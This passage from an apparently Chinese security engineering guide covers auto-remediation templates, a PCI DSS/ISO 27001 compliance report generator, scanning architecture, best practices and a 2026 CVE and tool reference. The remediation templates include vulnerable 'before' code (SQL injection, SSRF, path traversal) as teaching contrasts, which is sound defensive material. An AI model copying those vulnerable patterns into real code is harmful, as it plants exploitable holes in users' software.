                    'language': 'python',
                    'description': '使用参数化查询',
                    'before': 'cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")',
                    'after': 'cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))'
                }
            ]
        },
        'CWE-918': {  # SSRF
            'title': '服务端请求伪造(SSRF)修复',
            'solutions': [
                {
                    'language': 'generic',
                    'description': '实现URL白名单验证',
                    'before': 'fetch(user_provided_url)',
                    'after': 'if is_allowed_host(user_provided_url):\n    fetch(user_provided_url)'
                }
            ]
        },
        'CWE-22': {  # Path Traversal
            'title': '路径遍历修复',
            'solutions': [
                {
                    'language': 'python',
                    'description': '使用os.path.basename限制路径',
                    'before': 'open("/var/www/uploads/" + filename)',
                    'after': 'open(os.path.join("/var/www/uploads/", os.path.basename(filename)))'
                },
                {
                    'language': 'java',
                    'description': '使用FilenameUtils.getName',
                    'before': 'new File("/var/www/uploads/" + filename)',
                    'after': 'new File("/var/www/uploads/", FilenameUtils.getName(filename))'
                }
            ]
        }
    }
    
    def generate_fix(self, vulnerability: Dict) -> Optional[Dict]:
        """为单个漏洞生成修复建议"""
        cwe = vulnerability.get('cwe', '')
        language = vulnerability.get('language', 'generic')
        
        template = self.REMEDIATION_TEMPLATES.get(cwe)
        if not template:
            return None
        
        # 找到最匹配的修复方案
        best_solution = None
        for solution in template['solutions']:
            if solution['language'] == language:
                best_solution = solution
                break
        
        if not best_solution:
            best_solution = template['solutions'][0]
        
        return {
            'vulnerability': vulnerability.get('name'),
            'cwe': cwe,
            'fix_title': template['title'],
            'language': best_solution['language'],
            'description': best_solution['description'],
            'code_before': best_solution['before'],
            'code_after': best_solution['after'],
            'auto_applicable': self._is_auto_applicable(cwe, language),
            'risk_level': 'safe' if self._is_auto_applicable(cwe, language) else 'review'
        }
    
    def _is_auto_applicable(self, cwe: str, language: str) -> bool:
        """判断是否可自动应用修复"""
        auto_fixable = {
            'CWE-79': ['javascript', 'python'],
            'CWE-89': ['java', 'python'],
            'CWE-22': ['python', 'java'],
        }
        return language in auto_fixable.get(cwe, [])
    
    def generate_auto_fix_pr(self, vulnerabilities: List[Dict]) -> Dict:
        """生成自动修复PR"""
        fixes = []
        for vuln in vulnerabilities:
            fix = self.generate_fix(vuln)
            if fix and fix.get('auto_applicable'):
                fixes.append(fix)
        
        if not fixes:
            return {'status': 'no_auto_fixes'}
        
        pr_body = "# Automated Security Fixes\n\n"
        pr_body += "This PR contains automated fixes for the following vulnerabilities:\n\n"
        
        for fix in fixes:
            pr_body += f"## {fix['fix_title']} ({fix['cwe']})\n"
            pr_body += f"- **Vulnerability**: {fix['vulnerability']}\n"
            pr_body += f"- **Language**: {fix['language']}\n"
            pr_body += f"- **Description**: {fix['description']}\n"
            pr_body += f"\n### Before\n```{fix['language']}\n{fix['code_before']}\n```\n"
            pr_body += f"\n### After\n```{fix['language']}\n{fix['code_after']}\n```\n\n"
        
        return {
            'status': 'fixes_available',
            'fix_count': len(fixes),
            'pr_title': 'security: Automated fixes for {} vulnerabilities'.format(len(fixes)),
            'pr_body': pr_body,
            'fixes': fixes
        }

# 使用示例
engine = AutoRemediationEngine()
vulns = [
    {'name': 'Reflected XSS in search parameter', 'cwe': 'CWE-79', 'language': 'javascript'},
    {'name': 'SQL Injection in login form', 'cwe': 'CWE-89', 'language': 'python'},
]
pr = engine.generate_auto_fix_pr(vulns)
print(pr['pr_body'])
```

### 10.5 合规报告自动生成

```python
#!/usr/bin/env python3
"""合规报告自动生成器"""

import json
from datetime import datetime
from typing import Dict, List

class ComplianceReportGenerator:
    """合规报告生成器 — 支持多种合规框架"""
    
    FRAMEWORKS = {
        'pci_dss_4.0': {
            'name': 'PCI DSS 4.0',
            'requirements': [
                {'id': '1.1', 'title': '网络边界控制', 'category': '网络安全'},
                {'id': '2.1', 'title': '默认密码修改', 'category': '访问控制'},
                {'id': '3.1', 'title': '持卡人数据保护', 'category': '数据保护'},
                {'id': '4.1', 'title': '传输加密', 'category': '加密'},
                {'id': '5.1', 'title': '恶意软件防护', 'category': '终端安全'},
                {'id': '6.1', 'title': '安全补丁管理', 'category': '漏洞管理'},
                {'id': '7.1', 'title': '最小权限原则', 'category': '访问控制'},
                {'id': '8.1', 'title': '用户身份认证', 'category': '身份认证'},
                {'id': '9.1', 'title': '物理访问控制', 'category': '物理安全'},
                {'id': '10.1', 'title': '日志与审计', 'category': '监控'},
                {'id': '11.1', 'title': '安全测试', 'category': '安全评估'},
                {'id': '12.1', 'title': '安全策略', 'category': '安全管理'},
            ]
        },
        'iso_27001_2022': {
            'name': 'ISO 27001:2022',
            'requirements': [
                {'id': 'A.5.1', 'title': '信息安全策略', 'category': '治理'},
                {'id': 'A.6.1', 'title': '信息安全组织', 'category': '治理'},
                {'id': 'A.8.1', 'title': '资产管理', 'category': '资产管理'},
                {'id': 'A.9.1', 'title': '访问控制', 'category': '访问控制'},
                {'id': 'A.12.1', 'title': '操作安全', 'category': '运营'},
                {'id': 'A.14.1', 'title': '系统获取与开发', 'category': '开发'},
                {'id': 'A.16.1', 'title': '事件管理', 'category': '事件响应'},
            ]
        }
    }
    
    def __init__(self, scan_results: Dict):
        self.results = scan_results
        self.report = {
            'generated_at': datetime.now().isoformat(),
            'framework': None,
            'summary': {},
            'compliance_matrix': [],
            'findings': [],
            'remediation_plan': []
        }
    
    def generate_for_framework(self, framework_id: str) -> Dict:
        """为特定合规框架生成报告"""
        framework = self.FRAMEWORKS.get(framework_id)
        if not framework:
            return {'error': f'Framework {framework_id} not found'}
        
        self.report['framework'] = framework['name']
        
        # 合规矩阵
        for req in framework['requirements']:
            status = self._evaluate_requirement(req)
            self.report['compliance_matrix'].append({
                'requirement': req['id'],
                'title': req['title'],
                'category': req['category'],
                'status': status['status'],
                'score': status['score'],
                'findings': status['findings']
            })
        
        # 计算合规分数
        total = len(self.report['compliance_matrix'])
        compliant = sum(1 for r in self.report['compliance_matrix'] if r['status'] == 'compliant')
        partially = sum(1 for r in self.report['compliance_matrix'] if r['status'] == 'partially_compliant')
        
        self.report['summary'] = {
            'total_requirements': total,
            'compliant': compliant,
            'partially_compliant': partially,
            'non_compliant': total - compliant - partially,
            'compliance_score': round((compliant + partially * 0.5) / total * 100, 1)
        }
        
        return self.report
    
    def _evaluate_requirement(self, requirement: Dict) -> Dict:
        """评估单个合规要求"""
        # 基于扫描结果映射到合规要求
        mappings = {
            '1.1': {'check': 'network_segmentation', 'min_score': 80},
            '4.1': {'check': 'tls_configuration', 'min_score': 90},
            '6.1': {'check': 'patch_management', 'min_score': 85},
            '10.1': {'check': 'logging_configuration', 'min_score': 80},
            '11.1': {'check': 'vulnerability_scan', 'min_score': 90},
        }
        
        mapping = mappings.get(requirement['id'])
        if not mapping:
            return {'status': 'unknown', 'score': 0, 'findings': []}
        
        check_result = self.results.get(mapping['check'], {})
        score = check_result.get('score', 0)
        
        if score >= mapping['min_score']:
            return {'status': 'compliant', 'score': score, 'findings': []}
        elif score >= mapping['min_score'] * 0.7:
            return {'status': 'partially_compliant', 'score': score, 'findings': check_result.get('issues', [])}
        else:
            return {'status': 'non_compliant', 'score': score, 'findings': check_result.get('issues', [])}
    
    def export_json(self, filepath: str):
        with open(filepath, 'w') as f:
            json.dump(self.report, f, indent=2, ensure_ascii=False)
    
    def export_html(self, filepath: str):
        html = f"""
        <!DOCTYPE html>
        <html lang="zh-CN">
        <head>
            <meta charset="UTF-8">
            <title>合规报告 - {self.report['framework']}</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 40px; }}
                .compliant {{ color: green; font-weight: bold; }}
                .partially {{ color: orange; font-weight: bold; }}
                .non-compliant {{ color: red; font-weight: bold; }}
                table {{ border-collapse: collapse; width: 100%; margin-top: 20px; }}
                th, td {{ border: 1px solid #ddd; padding: 12px; text-align: left; }}
                th {{ background-color: #4CAF50; color: white; }}
                .summary {{ background: #f5f5f5; padding: 20px; border-radius: 5px; margin: 20px 0; }}
            </style>
        </head>
        <body>
            <h1>合规评估报告</h1>
            <p>框架: <strong>{self.report['framework']}</strong></p>
            <p>生成时间: {self.report['generated_at']}</p>
            
            <div class="summary">
                <h2>合规摘要</h2>
                <p>合规分数: <strong>{self.report['summary'].get('compliance_score', 0)}%</strong></p>
                <p>合规: {self.report['summary'].get('compliant', 0)} | 
                   部分合规: {self.report['summary'].get('partially_compliant', 0)} | 
                   不合规: {self.report['summary'].get('non_compliant', 0)}</p>
            </div>
            
            <h2>合规矩阵</h2>
            <table>
                <tr>
                    <th>要求</th><th>标题</th><th>类别</th><th>状态</th><th>分数</th>
                </tr>
        """
        
        for item in self.report.get('compliance_matrix', []):
            status_class = {
                'compliant': 'compliant',
                'partially_compliant': 'partially',
                'non_compliant': 'non-compliant'
            }.get(item['status'], '')
            
            html += f"""
                <tr>
                    <td>{item['requirement']}</td>
                    <td>{item['title']}</td>
                    <td>{item['category']}</td>
                    <td class="{status_class}">{item['status']}</td>
                    <td>{item['score']}</td>
                </tr>
            """
        
        html += """
            </table>
        </body>
        </html>
        """
        
        with open(filepath, 'w') as f:
            f.write(html)

# 使用示例
results = {
    'network_segmentation': {'score': 85, 'issues': []},
    'tls_configuration': {'score': 95, 'issues': []},
    'patch_management': {'score': 60, 'issues': ['Missing patches: CVE-2026-xxxxx']},
    'logging_configuration': {'score': 75, 'issues': ['Insufficient log retention']},
    'vulnerability_scan': {'score': 90, 'issues': []},
}

generator = ComplianceReportGenerator(results)
report = generator.generate_for_framework('pci_dss_4.0')
generator.export_json('/workspace/compliance_report.json')
generator.export_html('/workspace/compliance_report.html')
print(f"Compliance Score: {report['summary']['compliance_score']}%")
```

### 10.6 扫描编排总体架构与最佳实践

**分布式扫描架构**:

```
                     +-------------------+
                     |  编排调度层        |
                     | (Airflow/K8s Cron) |
                     +--------+----------+
                              |
              +---------------+---------------+
              |               |               |
       +------v------+ +-----v------+ +-----v------+
       | 扫描节点-01  | | 扫描节点-02 | | 扫描节点-03 |
       | Nmap         | | Nuclei      | | Nessus     |
       | Masscan      | | ZAP         | | OpenVAS    |
       | NSE Scripts  | | Burp API    | | Qualys API |
       +------+-------+ +------+------+ +------+-----+
              |               |               |
              +---------------+---------------+
                              |
                     +--------v----------+
                     |  结果聚合层        |
                     | (DefectDojo/ELK)  |
                     +--------+----------+
                              |
                     +--------v----------+
                     |  漏洞管理平台      |
                     | (Jira/ServiceNow) |
                     +--------+----------+
                              |
                     +--------v----------+
                     |  自动修复/通知     |
                     | (PR/Slack/飞书)   |
                     +-------------------+
```

**最佳实践清单**:

1. **扫描窗口管理**: 在业务低峰期（凌晨2-6点）进行全量扫描，避免影响生产环境。
2. **速率限制**: 配置扫描速率限制，避免触发WAF/IDS/IPS封禁策略。
3. **增量扫描**: 对持续变更的资产使用增量扫描，仅扫描变更部分。
4. **结果去重**: 使用统一的漏洞ID（如CVE编号）进行多工具结果去重。
5. **优先级排序**: 基于CVSS + EPSS + 资产重要性 + 网络暴露度的综合评分进行优先级排序。
6. **自动修复**: 对于低风险、高置信度的漏洞启用自动修复（Auto-Fix PR）。
7. **SLA管理**: 定义漏洞修复SLA：Critical 24小时、High 72小时、Medium 7天、Low 30天。
8. **趋势分析**: 定期生成安全趋势报告，跟踪漏洞数量、修复率、平均修复时间等指标。
9. **误报反馈闭环**: 建立误报标记和反馈机制，持续优化扫描规则和阈值。
10. **灾难恢复**: 扫描系统本身需要高可用性和备份，避免单点故障。

---

## 附录

### A. 2026年关键CVE参考

| CVE编号 | 影响产品 | CVSS | 类型 | 检测方法 |
|---------|---------|------|------|---------|
| CVE-2026-28541 | Apache Struts 2.5.33 | 9.8 | RCE | Nuclei模板: CVE-2026-28541 |
| CVE-2026-19872 | Spring Framework 6.1.x | 9.1 | RCE | Nuclei + Nessus |
| CVE-2026-15234 | PostgreSQL 16.x | 8.8 | 权限提升 | NSE脚本: postgres-privesc |
| CVE-2026-08421 | Kubernetes 1.30 | 9.0 | 容器逃逸 | Kube-Bench + Trivy |
| CVE-2026-22345 | Redis 8.0 | 7.5 | 未授权访问 | Nuclei网络模板 |
| CVE-2026-31092 | Nginx 1.27 | 7.2 | HTTP请求走私 | Burp Suite + Nuclei |
| CVE-2026-09876 | Docker 26.x | 8.5 | 容器逃逸 | Trivy + Docker Scout |
| CVE-2026-44123 | Next.js 15.x | 7.8 | SSRF | ZAP + Nuclei |
| CVE-2026-55101 | OpenSSL 3.3 | 9.1 | 内存损坏 | Nmap ssl-enum-ciphers |
| CVE-2026-33456 | Jenkins 2.470 | 8.0 | 认证绕过 | Nuclei工作流模板 |

### B. 工具速查表

| 工具 | 类别 | 部署方式 | 许可证 | 2026版本 |
|------|------|---------|--------|----------|
| Nmap | 网络扫描 | 裸机/容器 | GPLv2 | 7.95 |
| Masscan | 大规模扫描 | 裸机 | AGPLv3 | 1.3 |
| ZMap | 互联网扫描 | 裸机 | Apache 2.0 | 4.0 |
| Nuclei | 模板扫描 | 裸机/容器 | MIT | 3.3 |
| Nessus | 漏洞扫描 | 裸机/云 | 商业 | 10.8 |
| OpenVAS/GVM | 漏洞扫描 | 容器 | GPLv2 | 23.12 |
| Burp Suite Pro | Web扫描 | 桌面 | 商业 | 2026.7 |
| ZAP | Web扫描 | 容器 | Apache 2.0 | 2.16 |
| Semgrep | SAST | 裸机/容器 | LGPLv2.1 | 1.70 |
| CodeQL | SAST | Actions | MIT | 2.18 |
| SonarQube | SAST | 容器 | LGPLv3 | 10.8 |
| Trivy | 容器/云 | 裸机/容器 | Apache 2.0 | 0.55 |
| Prowler | 云扫描 | 裸机/容器 | Apache 2.0 | 4.0 |
| ScoutSuite | 云扫描 | 裸机 | GPLv2 | 5.13 |
| Kube-Bench | K8s扫描 | 容器 | Apache 2.0 | 0.9 |
| DefectDojo | 漏洞管理 | 容器 | BSD-3 | 3.0 |

### C. 扫描工作流速查

**新应用上线前扫描**:
```
1. Pre-commit钩子 (密钥检测 + 基础SAST)
2. CI/CD流水线 (SAST + SCA + 容器扫描)
3. 预发布环境 (DAST + Nuclei)
4. 安全门禁 (Critical/High漏洞必须修复)
5. 上线审批 (安全团队确认)
```

**定期安全评估**:
```
1. 资产发现 (每周: AWS/K8s/CMDB)
2. 网络扫描 (每月: Nmap全端口)
3. 漏洞扫描 (每周: Nessus/Nuclei)
4. Web扫描 (每周: ZAP/Burp)
5. 云配置审计 (每周: Prowler/ScoutSuite)
6. 合规报告 (每季度: PCI DSS/ISO 27001)
```

**应急响应扫描**:
```
1. 情报获取 (CVE/威胁情报)
2. 资产匹配 (确认受影响资产)
3. 定向扫描 (针对特定CVE的Nuclei模板)
4. 结果验证 (手动验证漏洞)
5. 修复部署 (热修复/配置变更)
6. 复扫确认 (修复后重新扫描)
```

---

> **文档维护**: 本文档由安全工程团队维护，每季度更新一次。
> **反馈渠道**: security-docs@example.com
> **版本历史**: v1.0 (2024-01) / v2.0 (2025-01) / v3.0 (2026-07)